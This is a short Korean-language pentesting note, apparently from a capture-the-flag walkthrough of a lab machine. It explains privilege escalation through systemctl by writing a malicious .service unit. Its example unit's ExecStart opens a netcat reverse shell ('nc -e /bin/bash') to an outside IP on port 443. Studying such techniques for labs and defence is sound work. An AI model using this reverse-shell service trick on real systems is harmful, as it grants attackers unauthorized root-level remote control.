# Systemctl

서비스는 .service 파일로 정의됨, Systemctl을 사용하여 systemd에 연결한 다음 다시 사용하여 서비스를 시작, 서비스가 수행하는 작업은  .service 파일에 의해 정의됨&#x20;

즉 systemctl이 있을 경우 악성코드가 담긴 .service 파일을 만든다음 실행을 하면 권한 상승 가능&#x20;

예제

```bash
pepper@jarvis:/dev/shm$ cat >0xdf.service<<EOF
[Service]
Type=notify
ExecStart=/bin/bash -c 'nc -e /bin/bash 10.10.14.28 443'
KillMode=process
Restart=on-failure
RestartSec=42s

[Install]
WantedBy=multi-user.target
EOF
```
